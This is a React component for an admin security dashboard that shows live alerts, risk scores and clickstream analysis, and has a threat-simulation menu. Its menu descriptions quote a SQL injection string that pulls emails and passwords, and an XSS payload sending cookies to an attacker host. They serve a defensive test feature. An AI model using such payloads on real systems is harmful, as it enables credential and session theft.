import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Menu, Sparkles, ShieldCheck, Activity, ShieldAlert, X, LogOut, Zap, AlertTriangle } from 'lucide-react';
import { useAdminAuth } from '../../context/AdminAuthContext';
import { adminAPI } from '../../services/api';
import { getSocket } from '../../services/socket';
import AdminSidebar from './components/AdminSidebar';
import SummaryCards from './components/SummaryCards';
import UsersTable from './components/UsersTable';
import BehaviorPanel from './components/BehaviorPanel';
import ForensicLogPanel from './components/ForensicLogPanel';
import SecurityLogTable from './components/SecurityLogTable';
import ActivityGraph from './components/Overview/ActivityGraph';
import RiskDistribution from './components/Overview/RiskDistribution';
import ClickstreamAnalysis from './components/Overview/ClickstreamAnalysis';
import SessionAnalytics from './components/Overview/SessionAnalytics';
import GeoLocationHeatmap from './components/Overview/GeoLocationHeatmap';
import LiveAlertsPanel from './components/Overview/LiveAlertsPanel';
import UserClickstreamList from './components/Overview/UserClickstreamList';

const AdminDashboard = () => {
  const [stats, setStats] = useState(null);
  const [anomalies, setAnomalies] = useState(null);
  const [activities, setActivities] = useState([]);
  const [users, setUsers] = useState([]);
  const [socMetrics, setSocMetrics] = useState(null);
  const [clickstreamData, setClickstreamData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState('overview');
  const [selectedUser, setSelectedUser] = useState(null);
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const [liveToast, setLiveToast] = useState(null);
  const [showSimModal, setShowSimModal] = useState(false);
  const [isSimulating, setIsSimulating] = useState(false);

  const { logout } = useAdminAuth();
  const navigate = useNavigate();

  const handleSimulateThreat = async (threatType) => {
    try {
      setIsSimulating(true);
      await adminAPI.simulateThreat({ threatType });
      setShowSimModal(false);
      // Wait a moment and sync metrics
      setTimeout(() => {
        fetchDashboardData();
      }, 1000);
    } catch (err) {
      console.error('Simulation error:', err);
    } finally {
      setIsSimulating(false);
    }
  };

  const handleAlertResolved = (alertId) => {
    setSocMetrics((prev) => {
      if (!prev) return prev;
      const updatedAlerts = (prev.alerts || []).map((a) =>
        a.id === alertId || a._id === alertId ? { ...a, status: 'RESOLVED', mitigationAction: 'INCIDENT_RESOLVED_BY_ADMIN' } : a
      );
      const activeCount = updatedAlerts.filter((a) => a.status !== 'RESOLVED').length;
      return {
        ...prev,
        alerts: updatedAlerts,
        kpi: {
          ...prev.kpi,
          detectedAnomalies: {
            ...prev.kpi?.detectedAnomalies,
            current: activeCount,
          },
        },
      };
    });
    fetchDashboardData();
  };

  useEffect(() => {
    fetchDashboardData();

    // ========================================
    // REAL-TIME WEBSOCKET TELEMETRY
    // ========================================
    const socket = getSocket();

    const handleSecurityAlert = (alert) => {
      console.log('[SOC Dashboard] 🚨 Live Alert Received via WebSocket:', alert);
      setLiveToast(alert);
      setTimeout(() => {
        setLiveToast((prev) => (prev?.id === alert.id ? null : prev));
      }, 7000);

      // Prepend to live SOC metrics alerts feed and increment genuine detected anomalies
      setSocMetrics((prev) => {
        if (!prev) return prev;
        const currentAlerts = prev.alerts || [];
        const nextAlerts = [alert, ...currentAlerts.filter((a) => a.id !== alert.id)];
        const activeCount = nextAlerts.filter((a) => a.status !== 'RESOLVED').length;
        return {
          ...prev,
          alerts: nextAlerts,
          kpi: {
            ...prev.kpi,
            detectedAnomalies: {
              ...prev.kpi?.detectedAnomalies,
              current: activeCount,
            },
          },
        };
      });

      // Increment detected anomalies count
      setStats((prevStats) => {
        if (!prevStats) return prevStats;
        return {
          ...prevStats,
          totalSuspicious: (prevStats.totalSuspicious || 0) + 1,
        };
      });
    };

    const handleRiskUpdate = (data) => {
      console.log('[SOC Dashboard] 📊 Risk update received:', data);
      setUsers((prevUsers) =>
        prevUsers.map((u) =>
          u._id === data.userId || u.id === data.userId
            ? { ...u, riskScore: data.riskScore, systemStatus: data.systemStatus }
            : u
        )
      );
    };

    const handleNewLog = (log) => {
      setActivities((prev) => [log, ...(prev || []).slice(0, 49)]);
    };

    socket.on('security_alert', handleSecurityAlert);
    socket.on('risk_score_updated', handleRiskUpdate);
    socket.on('new_activity_log', handleNewLog);

    return () => {
      socket.off('security_alert', handleSecurityAlert);
      socket.off('risk_score_updated', handleRiskUpdate);
      socket.off('new_activity_log', handleNewLog);
    };
  }, []);

  const fetchDashboardData = async () => {
    try {
      setLoading(true);
      const [statsRes, anomaliesRes, activitiesRes, usersRes, socMetricsRes, clickstreamRes] = await Promise.all([
        adminAPI.getDashboardStats(),
        adminAPI.getAnomalies(),
        adminAPI.getAllActivities({ limit: 50 }),
        adminAPI.getAllUsers(),
        adminAPI.getSOCMetrics(),
        adminAPI.getClickstreamMatrix()
      ]);

      setStats(statsRes.data.stats);
      setAnomalies(anomaliesRes.data.anomalies);
      setActivities(activitiesRes.data.activities);
      setSocMetrics(socMetricsRes.data.data);
      setClickstreamData(clickstreamRes.data.data);

      const activeUsers = (usersRes.data.users || []).filter((u) => !u.isDeleted);
      setUsers(activeUsers);
    } catch (error) {
      console.error('Error fetching dashboard data:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleLogout = () => {
    logout();
    navigate('/login');
  };

  const getPageTitle = () => {
    if (activeTab === 'overview') return 'SOC Overview';
    if (activeTab === 'users') return 'User Governance';
    if (activeTab === 'monitoring') return 'Behavioral Monitoring';
    if (activeTab === 'clickstream') return 'Clickstream Intelligence';
    return 'Admin Dashboard';
  };

  return (
    <div className="admin-theme min-h-screen w-full flex font-sans relative overflow-hidden bg-[#07111f] text-white">
      {/* Real-time Threat Pop-Up Toast */}
      {liveToast && (
        <div className="fixed top-6 right-6 z-50 max-w-md w-full bg-slate-900/95 border-2 border-red-500/80 p-4 rounded-2xl shadow-[0_0_30px_rgba(239,68,68,0.35)] backdrop-blur-xl animate-in slide-in-from-top-4 duration-300 flex items-start gap-3">
          <div className="p-2 rounded-xl bg-red-500/20 text-red-400 shrink-0">
            <ShieldAlert size={24} className="animate-pulse" />
          </div>
          <div className="flex-1 min-w-0">
            <div className="flex items-center justify-between gap-2 mb-1">
              <span className="text-xs font-black tracking-widest uppercase text-red-400 font-mono">
                {liveToast.type ? liveToast.type.replace(/_/g, ' ') : 'SECURITY ALERT'}
              </span>
              <button
                onClick={() => setLiveToast(null)}
                className="text-gray-400 hover:text-white p-0.5 rounded-lg hover:bg-white/10"
              >
                <X size={14} />
              </button>
            </div>
            <p className="text-sm font-semibold text-white leading-snug">{liveToast.description}</p>
            <div className="mt-2 flex items-center justify-between text-[11px] font-mono text-gray-400 border-t border-white/10 pt-1.5">
              <span>Target: {liveToast.user}</span>
              <span>{liveToast.ip}</span>
            </div>
          </div>
        </div>
      )}

      <div className="pointer-events-none absolute inset-0 z-0">
        <div className="absolute -top-24 left-[-10%] h-72 w-72 rounded-full bg-cyan-500/20 blur-3xl" />
        <div className="absolute right-[-6%] top-32 h-80 w-80 rounded-full bg-fuchsia-500/20 blur-3xl" />
        <div className="absolute bottom-0 left-1/3 h-72 w-72 rounded-full bg-violet-500/15 blur-3xl" />
        <div className="absolute inset-0 bg-[linear-gradient(rgba(255,255,255,0.045)_1px,transparent_1px),linear-gradient(90deg,rgba(255,255,255,0.045)_1px,transparent_1px)] bg-[size:32px_32px] opacity-[0.18]" />
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_top,rgba(14,165,233,0.08),transparent_30%),radial-gradient(circle_at_bottom_right,rgba(217,70,239,0.08),transparent_26%)]" />
      </div>

      {isMobileMenuOpen && (
        <div
          className="fixed inset-0 z-40 bg-slate-950/70 backdrop-blur-sm md:hidden"
          onClick={() => setIsMobileMenuOpen(false)}
        />
      )}

      <div
        className={`fixed inset-y-0 left-0 z-50 h-screen transform transition-transform duration-300 ease-out ${
          isMobileMenuOpen ? 'translate-x-0' : '-translate-x-full'
        } md:translate-x-0`}
      >
        <AdminSidebar
          activeTab={activeTab}
          setActiveTab={(tab) => {
            setActiveTab(tab);
            setIsMobileMenuOpen(false);
          }}
          handleLogout={handleLogout}
          onLogout={handleLogout}
        />
      </div>

      <div className="flex flex-1 flex-col md:pl-64 min-h-screen relative z-10 w-full overflow-x-hidden">
        <header className="sticky top-0 z-30 flex h-20 items-center justify-between border-b border-white/10 bg-[#07111f]/80 px-6 backdrop-blur-2xl md:px-8">
          <div className="flex items-center gap-4">
            <button
              onClick={() => setIsMobileMenuOpen(true)}
              className="flex h-10 w-10 items-center justify-center rounded-xl border border-white/10 bg-white/5 text-slate-200 transition hover:bg-white/10 md:hidden"
            >
              <Menu size={20} />
            </button>

            <div>
              <div className="flex items-center gap-2">
                <h1 className="text-xl font-bold tracking-tight text-white md:text-2xl">
                  {getPageTitle()}
                </h1>
                <span className="hidden rounded-full border border-cyan-400/30 bg-cyan-400/10 px-2.5 py-0.5 text-[11px] font-semibold text-cyan-300 sm:inline-flex">
                  Active SOC Shield
                </span>
              </div>
              <p className="text-xs text-slate-400">
                NutriCloud Behavioral Threat Vector Intelligence Platform
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2.5">
            <button
              onClick={() => setShowSimModal(true)}
              className="rounded-xl border border-amber-500/30 bg-amber-500/10 px-3.5 py-2 text-xs font-bold text-amber-300 backdrop-blur-md transition hover:bg-amber-500/20 hover:text-white flex items-center gap-1.5 shadow-[0_0_15px_rgba(245,158,11,0.15)]"
              title="Test real-time SOC behavioral defense vectors"
            >
              <Zap size={14} className="text-amber-400 animate-pulse" />
              <span>Simulate Threat</span>
            </button>

            <button
              onClick={fetchDashboardData}
              className="hidden rounded-xl border border-white/10 bg-white/5 px-3.5 py-2 text-xs font-semibold text-slate-200 backdrop-blur-md transition hover:bg-white/10 sm:inline-flex items-center gap-1.5"
            >
              <Activity size={14} className="text-cyan-400" />
              Sync Feeds
            </button>
            <button
              onClick={handleLogout}
              className="rounded-xl border border-rose-500/30 bg-rose-500/10 px-3.5 py-2 text-xs font-bold text-rose-300 backdrop-blur-md transition hover:bg-rose-500/20 hover:text-white flex items-center gap-1.5"
              title="Logout from Admin SOC"
            >
              <LogOut size={14} />
              <span>Logout</span>
            </button>
          </div>
        </header>

        {/* Threat Simulator Modal */}
        {showSimModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-md p-4">
            <div className="w-full max-w-lg rounded-3xl border border-amber-500/30 bg-[#0b1728] p-6 shadow-2xl relative animate-in fade-in zoom-in-95 duration-200">
              <div className="flex items-center justify-between pb-4 border-b border-white/10 mb-4">
                <div className="flex items-center gap-2.5">
                  <div className="p-2 rounded-xl bg-amber-500/20 text-amber-400">
                    <Zap size={20} />
                  </div>
                  <div>
                    <h3 className="text-base font-black tracking-wide uppercase text-white">
                      SOC Behavioral Threat Simulator
                    </h3>
                    <p className="text-xs text-gray-400">
                      Trigger an autonomous live threat vector against the active database
                    </p>
                  </div>
                </div>
                <button
                  onClick={() => setShowSimModal(false)}
                  className="p-1.5 text-gray-400 hover:text-white rounded-lg hover:bg-white/10"
                >
                  <X size={18} />
                </button>
              </div>

              <p className="text-xs text-gray-300 mb-4 leading-relaxed font-mono">
                Select an adversarial attack vector to inject. The SOC engine will detect the pattern, log the forensics, update live user risk scores, and broadcast instant WebSocket telemetry:
              </p>

              <div className="space-y-2.5 mb-6">
                {[
                  {
                    type: 'BRUTE_FORCE',
                    title: 'Brute-Force Credential Stuffing',
                    desc: 'Injects 6 rapid authentication failures to trigger brute-force account quarantine.',
                    badge: 'HIGH RISK',
                    color: 'text-red-400 border-red-500/30 bg-red-500/10',
                  },
                  {
                    type: 'SQL_INJECTION',
                    title: 'SQL Injection Payload (UNION SELECT)',
                    desc: "Injects `' UNION SELECT 1, email, password FROM users--` into query parameter.",
                    badge: 'CRITICAL',
                    color: 'text-rose-400 border-rose-500/30 bg-rose-500/10',
                  },
                  {
                    type: 'XSS_ATTACK',
                    title: 'Cross-Site Scripting (XSS Attack)',
                    desc: 'Injects `<script>fetch(attacker.io?cookie=...)</script>` payload in review payload.',
                    badge: 'HIGH RISK',
                    color: 'text-amber-400 border-amber-500/30 bg-amber-500/10',
                  },
                  {
                    type: 'RAPID_CHECKOUT',
                    title: 'High-Velocity Card Testing Surge',
                    desc: 'Simulates 5 rapid successive checkout requests within 45 seconds (bot velocity).',
                    badge: 'HIGH RISK',
                    color: 'text-orange-400 border-orange-500/30 bg-orange-500/10',
                  },
                  {
                    type: 'CLICKSTREAM_ANOMALY',
                    title: 'Markov Path Bypass Anomaly',
                    desc: "Bypasses standard catalog directly to checkout (P < 0.012% edge jump).",
                    badge: 'HIGH RISK',
                    color: 'text-cyan-400 border-cyan-500/30 bg-cyan-500/10',
                  },
                ].map((item) => (
                  <button
                    key={item.type}
                    onClick={() => handleSimulateThreat(item.type)}
                    disabled={isSimulating}
                    className="w-full text-left p-3.5 rounded-2xl border border-white/10 bg-white/5 hover:bg-white/10 hover:border-amber-500/40 transition-all flex items-start justify-between gap-3 group"
                  >
                    <div>
                      <div className="flex items-center gap-2 mb-1">
                        <span className="text-sm font-bold text-white group-hover:text-amber-300 transition-colors">
                          {item.title}
                        </span>
                        <span className={`text-[9px] font-mono font-bold px-1.5 py-0.5 rounded border ${item.color}`}>
                          {item.badge}
                        </span>
                      </div>
                      <p className="text-xs text-gray-400 leading-snug">{item.desc}</p>
                    </div>
                    <Zap size={16} className="text-gray-500 group-hover:text-amber-400 shrink-0 mt-1 transition-colors" />
                  </button>
                ))}
              </div>

              <div className="flex justify-end">
                <button
                  onClick={() => setShowSimModal(false)}
                  className="px-4 py-2 rounded-xl text-xs font-semibold text-gray-400 hover:text-white bg-white/5 hover:bg-white/10 transition-colors"
                >
                  Cancel
                </button>
              </div>
            </div>
          </div>
        )}

        <div className="flex-1 p-6 md:p-8 flex flex-col">
          {loading ? (
            <div className="flex h-full min-h-[400px] flex-1 items-center justify-center">
              <div className="flex flex-col items-center gap-3">
                <div className="h-10 w-10 animate-spin rounded-full border-4 border-cyan-500 border-t-transparent" />
                <p className="text-sm font-medium text-slate-400 font-mono">
                  Establishing Neural Telemetry Matrices...
                </p>
              </div>
            </div>
          ) : (
            <div className="flex flex-1 flex-col gap-6">
              {selectedUser ? (
                <ForensicLogPanel
                  user={selectedUser}
                  onClose={() => setSelectedUser(null)}
                />
              ) : (
                <>
                  {activeTab === 'overview' && socMetrics && (
                    <div className="flex flex-1 flex-col gap-6">
                      <div className="rounded-[28px] border border-white/10 bg-white/6 p-3 backdrop-blur-xl shadow-[0_8px_40px_rgba(0,0,0,0.18)]">
                        <SummaryCards kpi={socMetrics.kpi} />
                      </div>

                      <div className="rounded-[28px] border border-white/10 bg-white/7 p-2 backdrop-blur-xl shadow-[0_8px_40px_rgba(0,0,0,0.18)] min-h-[350px]">
                        <ActivityGraph data={socMetrics.activityTrend} />
                      </div>

                      <div className="grid grid-cols-1 gap-5 lg:grid-cols-5">
                        <div className="lg:col-span-2 rounded-[28px] border border-white/10 bg-white/7 p-2 backdrop-blur-xl shadow-[0_8px_40px_rgba(0,0,0,0.18)] min-h-[350px]">
                          <RiskDistribution data={socMetrics.riskDistribution} />
                        </div>

                        <div className="lg:col-span-3 rounded-[28px] border border-white/10 bg-white/7 p-2 backdrop-blur-xl shadow-[0_8px_40px_rgba(0,0,0,0.18)] min-h-[350px]">
                          <LiveAlertsPanel alerts={socMetrics.alerts} onAlertResolved={handleAlertResolved} />
                        </div>
                      </div>

                      <div className="rounded-[28px] border border-cyan-400/10 bg-gradient-to-br from-cyan-500/8 via-white/6 to-fuchsia-500/8 p-2 backdrop-blur-xl shadow-[0_8px_40px_rgba(0,0,0,0.18)]">
                        <ClickstreamAnalysis data={clickstreamData} />
                      </div>

                      <div className="rounded-[28px] border border-white/10 bg-white/7 p-2 backdrop-blur-xl shadow-[0_8px_40px_rgba(0,0,0,0.18)] min-h-[350px]">
                        <SecurityLogTable activities={activities.length > 0 ? activities.slice(0, 10) : []} />
                      </div>

                      <div className="grid grid-cols-1 gap-5 lg:grid-cols-2">
                        <div className="rounded-[28px] border border-white/10 bg-white/7 p-2 backdrop-blur-xl shadow-[0_8px_40px_rgba(0,0,0,0.18)] min-h-[400px]">
                          <SessionAnalytics data={socMetrics.sessionAnalytics} />
                        </div>

                        <div className="rounded-[28px] border border-white/10 bg-white/7 p-2 backdrop-blur-xl shadow-[0_8px_40px_rgba(0,0,0,0.18)] min-h-[400px]">
                          <GeoLocationHeatmap data={socMetrics.geoData} />
                        </div>
                      </div>
                    </div>
                  )}

                  {activeTab === 'users' && (
                    <div className="flex flex-1 flex-col gap-6">
                      <div className="rounded-[28px] border border-white/10 bg-white/6 p-3 backdrop-blur-xl shadow-[0_8px_40px_rgba(0,0,0,0.18)]">
                        <SummaryCards kpi={stats} />
                      </div>

                      <div className="rounded-[28px] border border-white/10 bg-white/7 p-2 backdrop-blur-xl shadow-[0_8px_40px_rgba(0,0,0,0.18)] flex-1">
                        <UsersTable
                          users={users}
                          fetchUsers={fetchDashboardData}
                          onSelectUser={setSelectedUser}
                          title="User Governance Directory"
                        />
                      </div>
                    </div>
                  )}

                  {activeTab === 'clickstream' && (
                    <div className="flex flex-1 min-h-[600px] flex-col gap-6">
                      <div className="rounded-[28px] border border-fuchsia-400/15 bg-gradient-to-r from-fuchsia-500/10 via-white/5 to-cyan-500/10 p-6 backdrop-blur-xl shadow-[0_8px_40px_rgba(0,0,0,0.2)]">
                        <h2 className="mb-2 text-xl font-black uppercase tracking-[0.08em] text-white">
                          Markov Transition Matrix Engine
                        </h2>
                        <p className="max-w-4xl text-sm leading-6 text-slate-300">
                          This system performs real-time Behavioral Probability Anomaly Detection.
                          It actively tracks all React Router context transitions globally across the application,
                          computing the absolute probability P(Target | Source) of every edge maneuver.
                        </p>
                      </div>

                      <div className="rounded-[28px] border border-white/10 bg-white/7 p-2 backdrop-blur-xl shadow-[0_8px_40px_rgba(0,0,0,0.18)] min-h-[400px]">
                        <ClickstreamAnalysis data={clickstreamData} />
                      </div>

                      <div className="rounded-[28px] border border-white/10 bg-white/7 p-2 backdrop-blur-xl shadow-[0_8px_40px_rgba(0,0,0,0.18)] min-h-[400px]">
                        <UserClickstreamList users={users} />
                      </div>
                    </div>
                  )}

                  {activeTab === 'monitoring' && (
                    <div className="flex flex-1 flex-col gap-6">
                      <div className="rounded-[28px] border border-white/10 bg-white/7 p-2 backdrop-blur-xl shadow-[0_8px_40px_rgba(0,0,0,0.18)]">
                        <BehaviorPanel anomalies={anomalies} />
                      </div>

                      <div className="rounded-[28px] border border-white/10 bg-white/7 p-2 backdrop-blur-xl shadow-[0_8px_40px_rgba(0,0,0,0.18)] flex-1">
                        <SecurityLogTable activities={activities} />
                      </div>
                    </div>
                  )}
                </>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default AdminDashboard;

